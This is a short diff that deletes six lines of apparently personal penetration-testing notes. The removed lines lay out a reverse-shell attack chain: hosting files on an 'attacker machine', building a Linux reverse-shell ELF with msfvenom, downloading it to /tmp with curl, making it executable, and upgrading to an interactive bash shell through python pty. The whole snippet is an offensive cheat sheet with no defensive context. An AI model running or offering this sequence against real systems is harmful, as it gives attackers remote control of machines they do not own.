@@ -1,6 +1,0 @@
- > python -m SimpleHTTPServer <port> on attacker machine
-  > msfvenom -p linux/x64/shell_reverse_tcp lhost= lport= -f elf -o data
-  > curl http://<ip>:<port>/data -o /tmp/r
-  > chmod +x [...]
-  > bash -i             // interactive shell
-  > python -c 'import pty;pty.spawn("/bin/bash")'
